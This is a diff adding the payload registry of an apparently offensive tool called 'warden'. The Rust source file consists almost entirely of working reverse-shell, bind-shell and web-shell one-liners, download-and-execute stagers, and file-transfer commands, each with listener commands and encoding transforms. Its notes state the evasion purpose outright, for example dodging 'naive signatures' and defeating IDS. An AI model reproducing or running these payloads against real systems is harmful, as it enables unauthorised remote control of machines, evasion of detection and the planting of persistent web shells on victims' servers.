@@ -1,0 +1,148 @@
+//! The payload registry. Templates use {lhost} {lport} {shell} {path} slots.
+//! Add an entry to teach warden a new one-liner.
+
+use super::transform::Kind as T;
+use super::{Kind::*, Lang::*, Os::*, Payload};
+
+macro_rules! p {
+    ($id:literal, $name:literal, $os:expr, $kind:expr, $lang:expr,
+     $tpl:literal, $lst:expr, $notes:literal, [$($t:expr),*], $w:literal) => {
+        Payload { id: $id, name: $name, os: $os, kind: $kind, lang: $lang,
+            template: $tpl, listener: $lst, notes: $notes,
+            transforms: &[$($t),*], weight: $w }
+    };
+}
+
+const NC: &str = "nc -lvnp {lport}";
+const NC_RL: &str = "rlwrap -cAr nc -lvnp {lport}";
+
+pub static REGISTRY: &[Payload] = &[
+    // ─────────────── Linux / *nix reverse shells
+    p!("bash-devtcp", "bash /dev/tcp", Linux, ReverseShell, Bash,
+        "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1", NC_RL,
+        "Needs a real bash (not dash). The classic. Wrap in `bash -c '...'` if launched from sh.",
+        [T::Base64, T::BashB64Exec, T::UrlEncode], 100),
+    p!("bash-5555", "bash /dev/tcp (fd 196)", Linux, ReverseShell, Bash,
+        "0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196", NC,
+        "Alternate fd form; survives some restricted shells.", [T::Base64], 70),
+    p!("sh-mkfifo", "sh mkfifo (nc no -e)", Linux, ReverseShell, Sh,
+        "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {lhost} {lport} >/tmp/f", NC_RL,
+        "Works when nc lacks -e. Uses a named pipe. Very portable.", [T::Base64, T::BashB64Exec], 92),
+    p!("nc-e", "nc -e", Linux, ReverseShell, Netcat,
+        "nc {lhost} {lport} -e /bin/sh", NC_RL,
+        "Only works with the traditional/OpenBSD nc built WITH -e (often disabled).", [], 80),
+    p!("ncat-e", "ncat --exec", Linux, ReverseShell, Ncat,
+        "ncat {lhost} {lport} -e /bin/bash", NC_RL,
+        "ncat (from nmap) supports --ssl for an encrypted shell.", [], 60),
+    p!("socat-tty", "socat (fully interactive TTY)", Linux, ReverseShell, Socat,
+        "socat TCP:{lhost}:{lport} EXEC:'{shell}',pty,stderr,setsid,sigint,sane",
+        "socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{lport}",
+        "Gives a fully interactive TTY with no manual upgrade needed. Requires socat on target.",
+        [T::Base64], 90),
+    p!("python-pty", "python3 pty.spawn", Linux, ReverseShell, Python,
+        "python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"{shell}\")'",
+        NC_RL,
+        "Spawns a pty directly, so the shell is interactive from the start.",
+        [T::Base64, T::PyB64Exec], 95),
+    p!("python-short", "python3 one-liner", Linux, ReverseShell, Python,
+        "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
+        NC_RL, "Shorter variant. Swap python3->python on older hosts.", [T::PyB64Exec], 78),
+    p!("php-fsockopen", "php fsockopen", Linux, ReverseShell, Php,
+        "php -r '$s=fsockopen(\"{lhost}\",{lport});$p=proc_open(\"{shell} -i\",array(0=>$s,1=>$s,2=>$s),$pipes);'",
+        NC_RL, "Requires proc_open (often disabled in hardened php). Try the exec variant if it fails.",
+        [T::Base64, T::PhpB64Eval], 85),
+    p!("php-exec", "php exec", Linux, ReverseShell, Php,
+        "php -r '$s=fsockopen(\"{lhost}\",{lport});exec(\"{shell} -i <&3 >&3 2>&3\");'",
+        NC_RL, "Fallback when proc_open is disabled.", [T::PhpB64Eval], 70),
+    p!("perl", "perl", Linux, ReverseShell, Perl,
+        "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{shell} -i\");};'",
+        NC_RL, "Perl is on almost every Linux host. Very reliable.", [T::Base64], 82),
+    p!("ruby", "ruby", Linux, ReverseShell, Ruby,
+        "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"{shell} -i <&%d >&%d 2>&%d\",f,f,f)'",
+        NC_RL, "", [T::Base64], 60),
+    p!("awk", "awk", Linux, ReverseShell, Awk,
+        "awk 'BEGIN{s=\"/inet/tcp/0/{lhost}/{lport}\";while(1){do{printf \"shell>\" |& s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!=\"exit\")close(s)}}' /dev/null",
+        NC, "Uses gawk's /inet extension. Handy on minimal hosts with gawk.", [], 40),
+    p!("lua", "lua", Linux, ReverseShell, Lua,
+        "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{lhost}','{lport}');os.execute('{shell} -i <&3 >&3 2>&3');\"",
+        NC, "Needs luasocket.", [], 35),
+    p!("golang", "go", Any, ReverseShell, Golang,
+        "echo 'package main;import(\"net\";\"os/exec\";\"os\");func main(){c,_:=net.Dial(\"tcp\",\"{lhost}:{lport}\");cmd:=exec.Command(\"{shell}\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/r.go && go run /tmp/r.go",
+        NC_RL, "Compile-and-run; needs the go toolchain on target.", [], 45),
+    p!("telnet", "telnet mkfifo", Linux, ReverseShell, Telnet,
+        "rm -f /tmp/p;mkfifo /tmp/p;telnet {lhost} {lport} 0</tmp/p|{shell} 1>/tmp/p", NC,
+        "When only telnet is available.", [], 30),
+    p!("openssl", "openssl encrypted", Linux, ReverseShell, Openssl,
+        "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {lhost}:{lport} > /tmp/s; rm /tmp/s",
+        "openssl req -x509 -newkey rsa:2048 -keyout k.pem -out c.pem -days 3 -nodes -subj '/CN=x' && openssl s_server -quiet -key k.pem -cert c.pem -port {lport}",
+        "TLS-encrypted shell — defeats plaintext IDS. Generate the cert first (listener cmd does it).",
+        [], 55),
+
+    // ─────────────── Windows reverse shells
+    p!("ps-tcpclient", "PowerShell TCPClient", Windows, ReverseShell, Powershell,
+        "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($sb,0,$sb.Length);$s.Flush()}}\"",
+        NC, "The standard Windows one-liner. Feed through /payload transform ps-encodedcommand to dodge quoting and naive signatures.",
+        [T::PsEncodedCommand, T::PsCharArray, T::XorPsStub, T::Base64], 98),
+    p!("ps-download-iex", "PowerShell download+IEX stager", Windows, Stager, Powershell,
+        "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}/rev.ps1')\"",
+        "python3 -m http.server 80   # host rev.ps1; catch shell separately",
+        "Fetches a stage from your HTTP server and runs it in memory. Host rev.ps1 (e.g. a TCPClient shell).",
+        [T::PsEncodedCommand], 88),
+    p!("cmd-ncat", "Windows nc.exe -e", Windows, ReverseShell, Cmd,
+        "nc.exe {lhost} {lport} -e cmd.exe", NC,
+        "Upload nc.exe first. Or use ncat.exe / powercat.", [], 60),
+    p!("powercat", "powercat", Windows, ReverseShell, Powershell,
+        "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}/powercat.ps1');powercat -c {lhost} -p {lport} -e cmd\"",
+        NC, "Host powercat.ps1 on your HTTP server.", [T::PsEncodedCommand], 62),
+
+    // ─────────────── bind shells
+    p!("nc-bind", "nc bind (mkfifo)", Linux, BindShell, Sh,
+        "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc -lvp {lport} >/tmp/f", "nc {rhost} {lport}",
+        "Listens ON the target; you connect in. Good when the target can't reach out.", [], 50),
+    p!("socat-bind", "socat bind TTY", Linux, BindShell, Socat,
+        "socat TCP-LISTEN:{lport},reuseaddr,fork EXEC:{shell},pty,stderr,setsid,sigint,sane",
+        "socat FILE:`tty`,raw,echo=0 TCP:{rhost}:{lport}", "Interactive bind shell.", [], 45),
+    p!("ps-bind", "PowerShell bind", Windows, BindShell, Powershell,
+        "powershell -nop -c \"$l=New-Object System.Net.Sockets.TcpListener('0.0.0.0',{lport});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}}\"",
+        "nc {rhost} {lport}", "", [T::PsEncodedCommand], 40),
+
+    // ─────────────── web shells
+    p!("php-webshell", "PHP web shell (?cmd=)", Any, WebShell, Php,
+        "<?php if(isset($_REQUEST['cmd'])){echo '<pre>';system($_REQUEST['cmd']);echo '</pre>';} ?>",
+        "curl 'http://{rhost}/shell.php?cmd=id'",
+        "Upload, then browse ?cmd=. Minimal footprint. Swap system() for passthru/shell_exec if disabled.",
+        [T::UrlEncode], 90),
+    p!("php-oneliner", "PHP one-line eval", Any, WebShell, Php,
+        "<?php @eval($_POST['x']); ?>", "curl -d 'x=system(\"id\");' http://{rhost}/s.php",
+        "Antak/China-Chopper style; pairs with a POST body.", [], 65),
+    p!("jsp-webshell", "JSP web shell", Any, WebShell, Jsp,
+        "<%@ page import=\"java.util.*,java.io.*\"%><% if(request.getParameter(\"cmd\")!=null){Process p=Runtime.getRuntime().exec(request.getParameter(\"cmd\"));BufferedReader d=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=d.readLine())!=null){out.println(l);}} %>",
+        "curl 'http://{rhost}/shell.jsp?cmd=id'", "Deploy into a servlet container webroot.", [], 70),
+    p!("aspx-webshell", "ASPX web shell", Windows, WebShell, Aspx,
+        "<%@ Page Language=\"C#\" %><% System.Diagnostics.Process p=new System.Diagnostics.Process();p.StartInfo.FileName=\"cmd.exe\";p.StartInfo.Arguments=\"/c \"+Request[\"cmd\"];p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd()); %>",
+        "curl 'http://{rhost}/shell.aspx?cmd=whoami'", "Drop into an IIS webroot with execute rights.", [], 68),
+
+    // ─────────────── TTY upgrade
+    p!("tty-python", "TTY upgrade (python pty)", Linux, TtyUpgrade, Python,
+        "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'   # then: Ctrl-Z; stty raw -echo; fg; export TERM=xterm; stty rows 50 cols 200",
+        "", "Full interactive-shell upgrade. Run the python line in the reverse shell, then the stty dance in YOUR terminal.",
+        [], 88),
+    p!("tty-script", "TTY upgrade (script)", Linux, TtyUpgrade, Sh,
+        "/usr/bin/script -qc /bin/bash /dev/null", "",
+        "Alternative when python is absent.", [], 60),
+
+    // ─────────────── file transfer to target
+    p!("dl-certutil", "Windows certutil download", Windows, FileTransfer, Cmd,
+        "certutil -urlcache -split -f http://{lhost}/{path} C:\\Windows\\Temp\\{path}",
+        "python3 -m http.server 80", "Living-off-the-land download. {path} = filename.", [], 80),
+    p!("dl-ps-iwr", "PowerShell IWR download", Windows, FileTransfer, Powershell,
+        "powershell -c \"Invoke-WebRequest http://{lhost}/{path} -OutFile C:\\Windows\\Temp\\{path}\"",
+        "python3 -m http.server 80", "", [], 78),
+    p!("dl-wget", "Linux wget/curl download", Linux, FileTransfer, Sh,
+        "wget http://{lhost}/{path} -O /tmp/{path} || curl http://{lhost}/{path} -o /tmp/{path}",
+        "python3 -m http.server 80", "", [], 76),
+    p!("xfer-smbserver", "impacket SMB drop", Any, FileTransfer, Sh,
+        "impacket-smbserver share . -smb2support",
+        "# on Windows target: copy \\\\{lhost}\\share\\{path} .",
+        "Host a share from your box; target copies over SMB. Add -user/-pass for auth'd SMB.", [], 70),
+];
